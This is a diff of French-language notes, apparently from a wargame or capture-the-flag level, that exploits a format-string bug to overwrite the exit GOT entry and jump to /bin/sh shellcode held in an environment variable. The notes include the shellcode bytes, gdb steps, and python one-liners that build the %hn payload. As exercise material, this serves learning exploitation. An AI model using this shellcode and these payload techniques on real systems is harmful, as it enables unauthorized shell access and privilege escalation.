@@ -19,7 +19,8 @@ On va modifier exit pour qu'il jump au shellcode ci-dessous:
 # "\xcd\x80"; // int 0x80
 
 # bash:
-	> export PAYLOAD05=$(python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
+export PAYLOAD05=$(python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
+	<!-- > export PAYLOAD05=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") -->
 
 # gdb:
 	> b main
@@ -31,8 +32,8 @@ On va modifier exit pour qu'il jump au shellcode ci-dessous:
 
 Notre payload a l'adresse 0xffffdf3e
 
-0xffffdf3e
-0xffffdf3e - 8 = 0xFFFFDF36
+0xffffdf3c
+0xffffdf3c - 8 = FFFFDF34
 
 # bash:
 	b *0x0804850c
@@ -41,7 +42,7 @@ Notre payload a l'adresse 0xffffdf3e
 
 	python -c 'print "\xff\xff\xd6\x78"[::-1] + "\xff\xff\xd6\x7a"[::-1] + "%57142c" + "%10$hn" + "%8385c" + "%11$hn"' > /tmp/payload05
 
-	python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57142c" + "%10$hn" + "%8385c" + "%11$hn"' > /tmp/payload05
+	python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57140c" + "%10$hn" + "%8387c" + "%11$hn"' > /tmp/payload05
 
 	x/24bx 0x08048370
 0x8048370 <exit@plt>:	0xff 0x25 0xe0 0x97 0x04 0x08 0x68 0x18
